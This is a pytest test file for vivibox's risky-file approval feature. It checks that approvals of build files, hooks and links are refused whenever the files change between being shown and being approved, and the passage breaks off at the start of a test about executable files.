"""An approval of risky files is of exactly what you were shown. A view of them has an identity
(risky.identity: the approval its diffs are made against and the files as its scan found them);
the approval carries it and takes the files only while the clone and the last approval still give
that identity. Anything else by then is refused whole, with nothing approved: you look again.

Here: the identity itself, the refusal for each way the state can move between the look and the
approval, the approval that passes, the race inside it, and the view (p) and the command line
(vivibox risky, then the command it ends with) each from end to end."""

import hashlib
import json
import os
import shutil
from pathlib import Path

import pytest
from conftest import make_repo
from test_gate import PLAN
from test_tui import run as run_view

from vivibox import actions, clone_read, panel, risky
from vivibox import repo as r
from vivibox.cli import main
from vivibox.config import load_config
from vivibox.risky import Approvals, Change
from vivibox.states import State
from vivibox.task import create_task, find_task

POM, RULES = "<project/>\n", "plugins { id 'java' }\n"


@pytest.fixture
def task(tmp_path, monkeypatch):
    """A task whose clone holds risky files it was approved with, and one change since."""
    monkeypatch.setenv("VIVIBOX_CONFIG_DIR", str(tmp_path / "config"))  # never your projects
    source = make_repo(tmp_path / "source")
    t = create_task(tmp_path / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(r.prepare(source, t.repo, t.id, t.meta))
    (t.repo / "data").mkdir()
    for name in ("a.txt", "b.txt"):
        (t.repo / "data" / name).write_text(RULES)
    (t.repo / "Makefile").write_text("check:\n\ttrue\n")
    (t.repo / "build.gradle").symlink_to("data/a.txt")
    Approvals(t.meta, t.repo).approve()
    (t.repo / "pom.xml").write_text(POM)
    return t


def approvals(t) -> Approvals:
    return Approvals(t.meta, t.repo)


def a_link_for_the_file(t) -> None:
    """A link in the file's place, to a file inside the repository with the very same bytes."""
    (t.repo / "data" / "pom.txt").write_text(POM)
    (t.repo / "pom.xml").unlink()
    (t.repo / "pom.xml").symlink_to("data/pom.txt")


def a_pipe_for_the_file(t) -> None:
    (t.repo / "pom.xml").unlink()
    os.mkfifo(t.repo / "pom.xml")


def another_target(t) -> None:
    """The link names another file, which holds the same bytes as the one it named."""
    (t.repo / "build.gradle").unlink()
    (t.repo / "build.gradle").symlink_to("data/b.txt")


# Each way the state you looked at can become another before your approval is taken.
MOVES = {
    "content edited": lambda t: (t.repo / "pom.xml").write_text("<project><build/></project>\n"),
    "what a link leads to edited": lambda t: (t.repo / "data" / "a.txt").write_text(
        "plugins { id 'evil' }\n"
    ),
    "a file replaced by a link": a_link_for_the_file,
    "a file replaced by a named pipe": a_pipe_for_the_file,
    "a file made executable": lambda t: (t.repo / "pom.xml").chmod(0o755),
    "a file added": lambda t: (t.repo / ".envrc").write_text("export X=1\n"),
    "a file removed": lambda t: (t.repo / "Makefile").unlink(),
    "a changed file gone": lambda t: (t.repo / "pom.xml").unlink(),
    "a link's target": another_target,
    # Another approval in between (a second window, say): the diffs you read were against the
    # one before it, with the Makefile as it then was.
    "the approval it is compared with": lambda t: (
        (t.repo / "Makefile").write_text("check:\n\tfalse\n"),
        approvals(t).approve(),
        (t.repo / "Makefile").write_text("check:\n\ttrue\n"),
    ),
}


# --- the identity ------------------------------------------------------------------------------------


def test_the_identity_is_the_same_while_nothing_changes_and_is_a_whole_digest(task):
    first, second = approvals(task).view().identity, approvals(task).view().identity
    assert first == second and len(first) == 64 and int(first, 16) >= 0


@pytest.mark.parametrize("move", list(MOVES))
def test_any_change_to_what_was_shown_changes_the_identity(task, move):
    before = approvals(task).view().identity
    MOVES[move](task)
    after = approvals(task).view().identity
    assert before and before != after
    assert after or move == "a file replaced by a named pipe", "a pipe is shown by no view at all"


def test_the_order_the_files_were_found_in_does_not_change_the_identity():
    approved = {"pom.xml": "1" * 64, "Makefile": "2" * 64}
    now = {"pom.xml": "3" * 64, ".envrc": "4" * 64, "Makefile": "2" * 64}
    modes = {"pom.xml": "0644", ".envrc": "0644", "Makefile": "0644"}
    again = risky.identity(
        dict(reversed(approved.items())), dict(reversed(now.items())), dict(reversed(modes.items()))
    )
    assert risky.identity(approved, now, modes) == again


@pytest.mark.parametrize(
    "other",
    [
        ({"pom.xml": "1" * 64}, {"pom.xml": "3" * 64}, {"pom.xml": "0755"}),  # its mode
        ({"pom.xml": "1" * 64}, {"pom.xml": "5" * 64}, {"pom.xml": "0644"}),  # its content
        ({"pom.xml": "1" * 64}, {"pom.xml": "symlink:x:" + "3" * 64}, {"pom.xml": "0644"}),  # its kind
        ({"pom.xml": "1" * 64}, {"pom.xml": "3" * 64, "a": "3" * 64}, {"pom.xml": "0644"}),  # one more
        ({"pom.xml": "1" * 64}, {}, {}),  # gone
        ({"pom.xml": "7" * 64}, {"pom.xml": "3" * 64}, {"pom.xml": "0644"}),  # the approval before
        ({}, {"pom.xml": "3" * 64}, {"pom.xml": "0644"}),
    ],
)
def test_the_identity_tells_each_part_of_the_state_apart(other):
    one = risky.identity({"pom.xml": "1" * 64}, {"pom.xml": "3" * 64}, {"pom.xml": "0644"})
    assert risky.identity(*other) != one


def test_a_path_and_its_digest_cannot_be_read_as_another_pair():
    """The parts are written as a structure, never joined: no path or digest ends another's."""
    assert risky.identity({}, {"a": "bc"}, {}) != risky.identity({}, {"ab": "c"}, {})
    assert risky.identity({"a": "b"}, {}, {}) != risky.identity({}, {"a": "b"}, {})


def test_the_mode_is_the_plain_files_own_and_nothing_is_opened_for_the_rest(task, tmp_path):
    for name in ("pom.xml", "data/a.txt"):
        (task.repo / name).chmod(0o644)
    assert clone_read.mode(task.repo, task.repo / "pom.xml") == "0644"
    (task.repo / "pom.xml").chmod(0o755)
    assert clone_read.mode(task.repo, task.repo / "pom.xml") == "0755"
    assert clone_read.mode(task.repo, task.repo / "build.gradle") == "0644", "what the link leads to"
    os.mkfifo(task.repo / "pipe")
    (task.repo / "out").symlink_to(tmp_path / "source" / "README.md")
    for name in ("pipe", "out", "data", "nothing"):
        assert clone_read.mode(task.repo, task.repo / name) == "", name


def test_a_view_with_a_file_it_could_not_show_has_no_identity(task):
    (task.repo / "bin.gradle").write_bytes(b"\x00\x01\xff")
    view = approvals(task).view()
    assert view.identity == "" and any("not shown" in said for said in view.diffs)


# --- the refusal -------------------------------------------------------------------------------------


def kept(t) -> tuple:
    """Everything an approval writes: the record, and the copies kept for later diffs."""
    folder = t.meta / "risky"
    files = sorted(
        (p.relative_to(folder).as_posix(), p.read_bytes()) for p in folder.rglob("*") if p.is_file()
    )
    return tuple(files)


@pytest.mark.parametrize("move", list(MOVES))
def test_an_approval_of_what_is_no_longer_shown_is_refused_whole(task, move):
    """Between the look and the approval: nothing is approved, not even the part that stayed."""
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT, State.VERIFY, State.APPROVAL_RISKY):
        task.transition(state)
    shown = approvals(task).view().identity
    MOVES[move](task)
    before = kept(task)
    with pytest.raises(risky.Unapprovable) as refused:
        actions.approve_risky(task, type("P", (), {"risky_extra": []}), shown)
    if move == "a file replaced by a named pipe":  # which no approval takes, shown or not
        assert "pom.xml is a FIFO, and vivibox does not read it, so it cannot be approved" in str(
            refused.value
        )
    else:
        assert type(refused.value) is risky.NotAsShown
        assert str(refused.value) == "the risky files changed since they were shown, so nothing was approved"
    assert kept(task) == before, "the record and its copies are as they were"
    assert task.read_state().state is State.APPROVAL_RISKY
    assert not [e for e in task.events() if e["type"] == "risky_approved"]


@pytest.mark.parametrize("shown", ["", "0" * 64, "not an identity"])
def test_an_approval_that_names_no_view_is_refused(task, shown):
    before = kept(task)
    with pytest.raises(risky.NotAsShown):
        approvals(task).approve_changes(shown)
    assert kept(task) == before


def test_a_file_that_could_not_be_shown_is_covered_by_no_identity(task):
    """Neither by the view's own, which is none, nor by one worked out for the state: the
    approval looks at each change again and refuses what it could not have shown."""
    (task.repo / "bin.gradle").write_bytes(b"\x00\x01\xff")
    now = risky.scan(task.repo)
    modes = {path: clone_read.mode(task.repo, task.repo / path) for path in now}
    worked_out = risky.identity(approvals(task).approved(), now, modes)
    before = kept(task)
    for shown in ("", worked_out):
        with pytest.raises(risky.Unapprovable, match="bin.gradle"):
            approvals(task).approve_changes(shown)
    assert kept(task) == before


# --- the approval that passes ------------------------------------------------------------------------


def test_an_approval_of_what_was_shown_approves_exactly_that_and_the_gate_takes_it(task):
    view = approvals(task).view()
    assert [said.splitlines()[0] for said in view.diffs] == ["pom.xml: added"]
    scanned = risky.scan(task.repo)
    assert approvals(task).approve_changes(view.identity) == [Change("pom.xml", "added")]
    assert approvals(task).approved() == scanned, "the record is the state that was shown"
    assert approvals(task).verified() == ([], {}), "the verification's own check finds nothing to approve"
    (task.repo / "pom.xml").write_text("<project><build/></project>\n")
    assert approvals(task).verified()[0] == [Change("pom.xml", "changed")], "and anything after it, again"


def test_a_file_changed_as_the_approval_is_written_approves_nothing(task, monkeypatch):
    """The race inside the approval, by hand: the approval has looked, and matched what you were
    shown; before its copies and its record are made the task's process edits the file. The copy
    is then not the bytes that were hashed, so nothing is recorded: the file waits for you."""
    shown, before = approvals(task).view().identity, kept(task)
    record = Approvals.approve

    def edited_first(self, *args, **kwargs):
        (task.repo / "pom.xml").write_text("<project><evil/></project>\n")
        return record(self, *args, **kwargs)

    monkeypatch.setattr(Approvals, "approve", edited_first)
    with pytest.raises(risky.NotAsShown):
        approvals(task).approve_changes(shown)
    monkeypatch.undo()
    assert kept(task) == before
    assert approvals(task).changes() == [Change("pom.xml", "added")]


def test_a_file_changed_between_the_approvals_scan_and_its_showing_approves_nothing(task, monkeypatch):
    """Earlier in the same approval: after its scan, before it reads the change to show it."""
    shown = approvals(task).view().identity
    scan = risky.scan

    def scan_then_edit(*args, **kwargs):
        now = scan(*args, **kwargs)
        (task.repo / "pom.xml").write_text("<project><evil/></project>\n")
        return now

    monkeypatch.setattr(risky, "scan", scan_then_edit)
    before = kept(task)
    with pytest.raises(risky.Unapprovable, match="it changed while vivibox read it"):
        approvals(task).approve_changes(shown)
    assert kept(task) == before


# --- the command line, end to end --------------------------------------------------------------------


def at_approval(env) -> tuple:
    assert main(["new", "demo", "Goal", "--draft"]) == 0
    t = find_task(load_config().tasks_dir, "demo-1")
    (t.repo / "pom.xml").write_text(POM)
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT, State.VERIFY):
        t.transition(state)
    t.transition(State.APPROVAL_RISKY, then=str(State.CHECKPOINT_BLOCKED))
    return t, env / "tasks" / "demo-1" / ".task" / "risky" / "approved.json"


def the_command(printed: str) -> list[str]:
    """The approval as vivibox risky's last line gives it, as the words of a command line."""
    last = printed.strip().splitlines()[-1]
    assert last.startswith("Approve these as shown with 'vivibox approve-risky "), last
    return last.split("'")[1].split()[1:]


def test_the_command_vivibox_risky_ends_with_approves_what_it_showed(env, capsys):
    t, record = at_approval(env)
    assert main(["risky", t.id]) == 0
    printed = capsys.readouterr().out
    assert "pom.xml: added" in printed
    command = the_command(printed)
    assert command[:2] == ["approve-risky", t.id] and len(command[2]) == 64
    assert main(command) == 0
    assert capsys.readouterr().out.startswith("Approved 1 change(s) to risky files.")
    assert "pom.xml" in json.loads(record.read_text()) and t.read_state().state is State.CHECKPOINT_BLOCKED


def test_the_command_is_refused_once_the_files_are_not_what_it_showed(env, capsys):
    t, record = at_approval(env)
    assert main(["risky", t.id]) == 0
    command, before = the_command(capsys.readouterr().out), record.read_bytes()
    (t.repo / "pom.xml").write_text("<project><evil/></project>\n")
    assert main(command) == 1
    said = capsys.readouterr()
    assert said.out == "" and said.err == (
        "vivibox: the risky files changed since they were shown, so nothing was approved: run "
        f"'vivibox risky {t.id}', read what it shows, then run the command it ends with\n"
    )
    assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
    assert main(["risky", t.id]) == 0
    again = the_command(capsys.readouterr().out)
    assert again != command and main(again) == 0, "what it shows now is what its command approves"


def test_approve_risky_told_of_no_view_approves_nothing(env, capsys):
    t, record = at_approval(env)
    before = record.read_bytes()
    assert main(["approve-risky", t.id]) == 1
    assert capsys.readouterr().err == (
        "vivibox: approve-risky approves the risky files as vivibox risky showed them, and was told of "
        f"none: run 'vivibox risky {t.id}', read what it shows, then run the command it ends with\n"
    )
    assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY


def test_vivibox_risky_gives_no_command_for_what_it_could_not_show(env, capsys):
    t, record = at_approval(env)
    (t.repo / "bin.gradle").write_bytes(b"\x00\x01\xff")
    assert main(["risky", t.id]) == 0
    printed = capsys.readouterr().out
    assert "approve-risky" not in printed
    assert printed.strip().splitlines()[-1] == (
        "Nothing is approved while a file above is not shown whole or cannot be approved; each says why."
    )


# --- the view, end to end ----------------------------------------------------------------------------


def said_in(app) -> list[str]:
    return [str(n.message) for n in app._notifications]


def test_p_approves_what_the_panel_showed(env):
    t, record = at_approval(env)

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")  # the details: the risky files, as they are
        await pilot.pause()
        await pilot.press("p")
        await pilot.press("enter")  # Approve
        await pilot.pause()
        assert "pom.xml" in json.loads(record.read_text()), said_in(app)
        assert t.read_state().state is State.CHECKPOINT_BLOCKED

    run_view(scenario, notifications=True)


def test_p_refuses_files_that_changed_since_the_panel_showed_them(env):
    """The task's process edits the file after you read it. p refuses, saying so, and the panel
    draws the files as they are now; what the next p approves is that drawing."""
    t, record = at_approval(env)
    before = record.read_bytes()

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        assert "+<project/>" in app.shown
        (t.repo / "pom.xml").write_text("<project><evil/></project>\n")
        app.reload()  # the view's own refresh between the look and the key
        await pilot.pause()
        await pilot.press("p")
        await pilot.press("enter")
        await pilot.pause()
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
        assert said_in(app)[-1] == (
            "the risky files changed since they were shown, so nothing was approved; the details show "
            "them as they are now: read them again, then p"
        )
        assert "+<project><evil/></project>" in app.shown, "drawn again, as they are"
        await pilot.press("p")  # having read them again
        await pilot.press("enter")
        await pilot.pause()
        assert t.read_state().state is not State.APPROVAL_RISKY, said_in(app)
        assert approvals(t).changes() == []

    run_view(scenario, notifications=True)


def test_a_refresh_nobody_asked_for_never_replaces_what_you_read(env):
    """The panel is drawn again for its own reasons (the pod answered, the list changed) after
    the file was edited: what you read stays, a line of vivibox's own says the files changed,
    and p on that drawing approves nothing."""
    t, record = at_approval(env)
    before = record.read_bytes()

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        (t.repo / "pom.xml").write_text(EVIL)
        app.show_detail()  # as a refresh that found something changed draws it
        await pilot.pause()
        assert "+<project/>" in app.shown and "evil" not in app.shown, "what you read is still there"
        assert panel.RISKY_MOVED in app.shown, "and it says the files are others now"
        await pilot.press("p")
        await pilot.press("enter")
        await pilot.pause()
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
        assert "changed since they were shown" in said_in(app)[-1]
        assert "evil" in app.shown and panel.RISKY_MOVED not in app.shown, "drawn again, as they are"

    run_view(scenario, notifications=True)


EVIL, BENIGN = "<project><evil/></project>\n", "<project><benign/></project>\n"


def identity_of(t, content: str) -> str:
    """The identity a view has while pom.xml holds content."""
    was = (t.repo / "pom.xml").read_text()
    (t.repo / "pom.xml").write_text(content)
    try:
        return approvals(t).view().identity
    finally:
        (t.repo / "pom.xml").write_text(was)


def on_screen(app, t) -> str:
    """What the panel shows of pom.xml and what p would carry, which are one thing or the test
    fails here: "" for neither, else the content whose view is drawn and bound."""
    bound = app.risky_bound
    shown = [name for name, mark in (("evil", "<evil/>"), ("benign", "<benign/>")) if mark in app.shown]
    if bound is None:
        return ""
    assert not app.panel.has_class("hidden") and app.selected()[0].id == bound[0] == t.id
    held = {identity_of(t, EVIL): "evil", identity_of(t, BENIGN): "benign"}[bound[2].identity]
    assert shown == [held], f"the screen shows {shown}, p would approve {held}"
    assert all(diff.rstrip() in app.shown for diff in bound[2].diffs), "the bound view's own diffs"
    return held


def test_p_approves_what_is_on_the_screen_when_the_first_drawing_was_another(env):
    """E, then B, then E again. Whatever was drawn first, what p approves is what the screen
    shows at the key: here E stays on the screen through the refresh, said to have changed
    while it had, so the approval of E is an approval of what was read."""
    t, record = at_approval(env)
    (t.repo / "pom.xml").write_text(EVIL)

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")  # the first drawing: E
        await pilot.pause()
        assert on_screen(app, t) == "evil"
        (t.repo / "pom.xml").write_text(BENIGN)
        app.show_detail()  # a redraw nobody asked for
        await pilot.pause()
        assert on_screen(app, t) == "evil" and panel.RISKY_MOVED in app.shown, "never B under your eyes"
        (t.repo / "pom.xml").write_text(EVIL)
        app.show_detail()
        await pilot.pause()
        assert on_screen(app, t) == "evil" and panel.RISKY_MOVED not in app.shown
        await pilot.press("p")
        assert on_screen(app, t) == "evil", "at the key"
        await pilot.press("enter")
        await pilot.pause()
        assert json.loads(record.read_text())["pom.xml"] == hashlib.sha256(EVIL.encode()).hexdigest()

    run_view(scenario, notifications=True)


def test_p_never_approves_a_state_the_screen_does_not_show(env):
    """The other direction: B is on the screen (asked for, with d) and the clone holds E at the
    key. Refused; the screen is then E's, and that is what the next p carries."""
    t, record = at_approval(env)
    (t.repo / "pom.xml").write_text(EVIL)
    before = record.read_bytes()

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        (t.repo / "pom.xml").write_text(BENIGN)
        await pilot.press("d")
        await pilot.press("d")  # looked again: B, by your own key
        await pilot.pause()
        assert on_screen(app, t) == "benign"
        (t.repo / "pom.xml").write_text(EVIL)  # back; nothing redraws the panel for a file
        app.reload()
        await pilot.pause()
        assert on_screen(app, t) == "benign"
        await pilot.press("p")
        await pilot.press("enter")
        await pilot.pause()
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
        assert "changed since they were shown" in said_in(app)[-1]
        assert on_screen(app, t) == "evil"

    run_view(scenario, notifications=True)


def test_p_with_the_details_closed_approves_no_row_drawn_earlier(env):
    """The details open, the cursor across the risky row, the details closed on another row,
    back: nothing of the risky files is on the screen, so nothing is asked and nothing approved."""
    t, record = at_approval(env)
    assert main(["new", "demo", "Other", "--draft"]) == 0
    other = find_task(load_config().tasks_dir, "demo-2")
    before = record.read_bytes()

    async def scenario(app, pilot):
        app.reload()
        await pilot.pause()
        assert [task.id for task, _ in app.pairs] == [other.id, t.id] and app.selected()[0].id == other.id
        await pilot.press("d")  # the details, open
        await pilot.press("down")  # the cursor on the risky row: drawn
        await pilot.pause()
        assert app.risky_bound is not None and app.risky_bound[0] == t.id
        await pilot.press("up")
        await pilot.pause()
        assert app.risky_bound is None, "another row on the screen: nothing bound"
        await pilot.press("d")  # closed, on the other row
        await pilot.press("down")
        await pilot.pause()
        assert app.selected()[0].id == t.id and app.panel.has_class("hidden") and app.risky_bound is None
        await pilot.press("p")
        await pilot.pause()
        assert type(app.screen).__name__ != "Confirm", "no question with nothing shown"
        assert said_in(app)[-1].startswith(f"The risky files of {t.id} are not shown")
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY

    run_view(scenario, notifications=True)


def test_the_screen_and_what_p_carries_are_one_view_after_every_kind_of_redraw(env):
    """The timer's refresh, the pod's answer, the row left and come back to, the details closed
    and opened, a dialog opened and closed, a refusal: after each, with the clone moved between
    E and B at every step, on_screen holds (it fails where the screen and the binding differ),
    and only your own keys move what is shown. A resize is the test after this one."""
    t, record = at_approval(env)
    assert main(["new", "demo", "Other", "--draft"]) == 0
    (t.repo / "pom.xml").write_text(EVIL)

    async def scenario(app, pilot):
        clone = t.repo / "pom.xml"
        app.reload()
        await pilot.press("down")
        await pilot.press("d")
        await pilot.pause()
        assert on_screen(app, t) == "evil"
        clone.write_text(BENIGN)
        app.reload()  # the timer
        app.pods_answered({t.id: panel.PodView("198.51.100.2", [])})  # the pod answered
        await pilot.pause()
        assert on_screen(app, t) == "evil", "no refresh of its own moves it"
        await pilot.press("question_mark")  # a dialog opened, the timer under it, and closed
        app.reload()
        await pilot.press("escape")
        await pilot.pause()
        assert on_screen(app, t) == "evil"
        await pilot.press("up")  # the row left
        await pilot.pause()
        assert on_screen(app, t) == ""
        await pilot.press("down")  # and come back to: your look, at the files as they are
        await pilot.pause()
        assert on_screen(app, t) == "benign"
        clone.write_text(EVIL)
        await pilot.press("d")  # the details closed
        await pilot.pause()
        assert on_screen(app, t) == ""
        await pilot.press("d")  # and opened
        await pilot.pause()
        assert on_screen(app, t) == "evil"
        clone.write_text(BENIGN)
        await pilot.press("p")  # a refusal
        await pilot.press("enter")
        await pilot.pause()
        assert t.read_state().state is State.APPROVAL_RISKY and on_screen(app, t) == "benign"
        await pilot.press("p")  # asked, and not answered yes
        await pilot.press("escape")
        await pilot.pause()
        assert on_screen(app, t) == "benign" and t.read_state().state is State.APPROVAL_RISKY

    run_view(scenario, notifications=True)


def test_a_resize_draws_nothing_of_the_files_as_they_are_now(env):
    """A resize builds the list again, and may leave the cursor on another row: then nothing is
    bound. Where the row stays, so does what was read. Never B, which nobody asked to see."""
    t, record = at_approval(env)
    (t.repo / "pom.xml").write_text(EVIL)

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        assert on_screen(app, t) == "evil"
        (t.repo / "pom.xml").write_text(BENIGN)
        for size in ((100, 30), (140, 40), (80, 24)):
            await pilot.resize_terminal(*size)
            await pilot.pause()
            assert on_screen(app, t) in ("evil", ""), size
            assert "benign" not in app.shown, size

    run_view(scenario, notifications=True)


def test_closing_and_opening_the_details_is_looking_again(env):
    t, record = at_approval(env)

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        (t.repo / "pom.xml").write_text("<project><build/></project>\n")
        await pilot.press("d")  # closed
        await pilot.press("d")  # and opened by you: drawn as the files are now
        await pilot.pause()
        assert "+<project><build/></project>" in app.shown
        await pilot.press("p")
        await pilot.press("enter")
        await pilot.pause()
        assert t.read_state().state is not State.APPROVAL_RISKY, said_in(app)

    run_view(scenario, notifications=True)


def test_p_refuses_a_change_made_while_its_question_is_open(env):
    """Between the key and the answer: the identity went with the key."""
    t, record = at_approval(env)
    before = record.read_bytes()

    async def scenario(app, pilot):
        app.reload()
        await pilot.press("d")
        await pilot.pause()
        await pilot.press("p")
        (t.repo / "pom.xml").write_text("<project><evil/></project>\n")
        await pilot.press("enter")
        await pilot.pause()
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
        assert "changed since they were shown" in said_in(app)[-1]

    run_view(scenario, notifications=True)


def test_p_approves_nothing_the_panel_never_showed(env):
    """The details closed: nothing was shown, so there is nothing p could be an approval of."""
    t, record = at_approval(env)
    before = record.read_bytes()

    async def scenario(app, pilot):
        app.reload()
        await pilot.pause()
        await pilot.press("p")
        await pilot.pause()
        assert said_in(app)[-1] == (
            f"The risky files of {t.id} are not shown: open the details (d), read them, then p."
        )
        assert record.read_bytes() == before and t.read_state().state is State.APPROVAL_RISKY
        assert type(app.screen).__name__ != "Confirm", "no question about what was not shown"

    run_view(scenario, notifications=True)


def test_the_copies_for_later_diffs_are_of_what_was_approved(task):
    shown = approvals(task).view().identity
    approvals(task).approve_changes(shown)
    assert (task.meta / "risky" / "files" / "pom.xml").read_text() == POM
    assert not (task.meta / "risky" / "view").exists(), "what was copied for you to read is gone"
    shutil.rmtree(task.repo / "data")
    assert Path(task.meta / "risky" / "approved.json").exists()


def test_a_task_waiting_with_nothing_left_to_approve_is_moved_on_by_the_same_command(env, capsys):
    """The writer took its change back while the task waited: nothing to show, and the approval
    of that, by its identity, is what moves the task on."""
    t, record = at_approval(env)
    (t.repo / "pom.xml").unlink()
    capsys.readouterr()
    assert main(["risky", t.id]) == 0
    first, last = capsys.readouterr().out.strip().splitlines()
    assert first == "No changes to risky files since your last approval."
    assert last.startswith("The task still waits for your approval: 'vivibox approve-risky demo-1 ")
    assert main(last.split("'")[1].split()[1:]) == 0
    assert t.read_state().state is State.CHECKPOINT_BLOCKED


# --- the copy a later diff is drawn against ----------------------------------------------------------

HOSTILE = "<project>\n<evil/>\n" + "".join(f"<dep n='{i}'/>\n" for i in range(8)) + "</project>\n"


def swapped_around(task, monkeypatch, what: str = "/files") -> None:
    """The interleaving, by hand: as the approval copies pom.xml for later diffs, the file is
    another, and it is the shown one again before anything scans the clone."""
    copy = clone_read.copy

    def swapped_around_the_copy(root, path, target, *a, **k):
        if str(path).endswith("pom.xml") and what in str(target):
            (task.repo / "pom.xml").write_text(HOSTILE)  # after the pass hashed and showed it
            try:
                return copy(root, path, target, *a, **k)
            finally:
                (task.repo / "pom.xml").write_text(POM)  # and back
        return copy(root, path, target, *a, **k)

    monkeypatch.setattr(clone_read, "copy", swapped_around_the_copy)


def test_a_file_swapped_as_the_approval_copies_it_is_approved_by_no_part(task, monkeypatch):
    """What is kept as approved is the bytes that were hashed for what you confirmed, or nothing
    is approved: never a copy of content no view showed, for the next diff to be drawn against."""
    shown, before = approvals(task).view().identity, kept(task)
    swapped_around(task, monkeypatch)
    with pytest.raises(risky.NotAsShown):
        approvals(task).approve_changes(shown)
    monkeypatch.undo()
    assert kept(task) == before, "the record and every copy kept before are as they were"
    assert "evil" not in "".join(text.decode() for _, text in kept(task))
    assert approvals(task).changes() == [Change("pom.xml", "added")], "still yours to approve"


def test_a_kept_copy_that_is_not_what_was_approved_is_never_the_side_a_diff_is_drawn_against(task):
    """A copy from before this was held (or changed since by anything): the record says what was
    approved, the copy is not it, so the new content is shown whole, the hidden line with it."""
    approvals(task).approve_changes(approvals(task).view().identity)
    (task.meta / "risky" / "files" / "pom.xml").write_text(HOSTILE)
    (task.repo / "pom.xml").write_text(HOSTILE + "<!-- a comment -->\n")
    view = approvals(task).view()
    said = "\n".join(view.diffs)
    assert "+<evil/>" in said and "+<!-- a comment -->" in said, "whole: every line of it is new to you"
    assert "is not what was approved" in said


# --- what cannot be shown whole is covered by no approval ----------------------------------------------


def a_pipe(t) -> None:
    os.mkfifo(t.repo / "build.gradle.kts")


def a_link_to_a_folder(t) -> None:
    (t.repo / "stuff").mkdir()
    (t.repo / "stuff" / "workspace.xml").write_text("<project/>\n")
    (t.repo / ".idea").symlink_to("stuff")


def a_link_to_nothing(t) -> None:
    (t.repo / "gradle.properties").symlink_to("not-there-yet")


def a_link_to_a_pipe(t) -> None:
    os.mkfifo(t.repo / "data" / "pipe")
    (t.repo / "gradle.properties").symlink_to("data/pipe")


def a_file_nobody_reads(t) -> None:
    (t.repo / "settings.gradle").write_text("include 'x'\n")
    (t.repo / "settings.gradle").chmod(0)


WRITER = "so it cannot be approved: reply, and the writer removes"
NOTHING = "vivibox can show nothing of what it leads to"
UNSHOWN = {
    "a named pipe": (a_pipe, f"build.gradle.kts is a FIFO, and vivibox does not read it, {WRITER} it or "),
    "a link to a folder": (
        a_link_to_a_folder,
        f".idea is a link to a folder (stuff): {NOTHING}, {WRITER} the",
    ),
    "a link to nothing": (
        a_link_to_nothing,
        f"is a link to nothing (not-there-yet): {NOTHING}, {WRITER} the",
    ),
    "a link to a named pipe": (a_link_to_a_pipe, f"is a link to a FIFO (data/pipe): {NOTHING}, {WRITER} the"),
    "a file that cannot be read": (
        a_file_nobody_reads,
        "settings.gradle cannot be read (Permission denied), ",
    ),
}


@pytest.mark.parametrize("what", list(UNSHOWN))
def test_a_file_vivibox_cannot_show_whole_is_covered_by_no_approval(task, what):
    """Added by the work: said as what it is, with the step that works, given no identity by
    the view, refused by the approval whatever identity it is handed, and found again by the
    verification's own check for as long as it is there."""
    if what == "a file that cannot be read" and os.geteuid() == 0:
        pytest.skip("root reads every file")
    make, said = UNSHOWN[what]
    make(task)
    view = approvals(task).view()
    assert view.identity == "", "no approval can name this view"
    assert said in "\n".join(view.diffs), "\n".join(view.diffs)
    now = risky.scan(task.repo)
    modes = {path: clone_read.mode(task.repo, task.repo / path) for path in now}
    before = kept(task)
    for shown in ("", risky.identity(approvals(task).approved(), now, modes)):
        with pytest.raises(risky.Unapprovable) as refused:
            approvals(task).approve_changes(shown)
        assert said in str(refused.value) and not isinstance(refused.value, risky.NotAsShown)
    assert kept(task) == before
    assert approvals(task).verified()[0], "a change, at every check"


def test_vivibox_risky_offers_no_approval_of_a_named_pipe(env, capsys):
    t, record = at_approval(env)
    os.mkfifo(t.repo / "build.gradle")
    before = record.read_bytes()
    capsys.readouterr()
    assert main(["risky", t.id]) == 0
    printed = capsys.readouterr().out
    assert (
        "build.gradle: added: build.gradle is a FIFO, and vivibox does not read it, so it cannot" in printed
    )
    assert "approve-risky" not in printed and "Nothing is approved while a file above" in printed
    assert main(["approve-risky", t.id, "0" * 64]) == 1
    assert "build.gradle is a FIFO" in capsys.readouterr().err and record.read_bytes() == before


def test_a_link_to_a_folder_your_repository_already_had_is_not_the_works_change(env):
    """The base's own: recorded by the first approval by its target, as before, and no change
    at any check. Named another folder by the work, it is the work's, and no approval takes it."""
    import subprocess

    source = env / "repo"
    (source / "stuff").mkdir()
    (source / "stuff" / "workspace.xml").write_text("<project/>\n")
    (source / ".idea").symlink_to("stuff")
    for args in (("add", "-A"), ("commit", "-q", "-m", "Share the IDE's folder")):
        subprocess.run(["git", *args], cwd=source, check=True, capture_output=True)
    assert main(["new", "demo", "Goal", "--draft"]) == 0
    t = find_task(load_config().tasks_dir, "demo-1")
    assert approvals(t).changes() == [] and approvals(t).view().identity
    (t.repo / "other").mkdir()
    (t.repo / ".idea").unlink()
    (t.repo / ".idea").symlink_to("other")
    view = approvals(t).view()
    assert (
        view.identity == ""
        and ".idea is a link to a folder (other): vivibox can show nothing" in view.diffs[0]
    )


# --- whether a file can be run -----------------------------------------------------------------------


def hook(t, mode: int = 0o644):
    (t.repo / ".husky").mkdir(exist_ok=True)
    path = t.repo / ".husky" / "pre-commit"
    path.write_text("#!/bin/sh\nnpm test\n")
    path.chmod(mode)
    return path


def heads(t) -> list[str]:
    return [said.splitlines()[0] for said in approvals(t).view().diffs]


def test_a_file_made_executable_before_you_look_is_said_to_be(task):
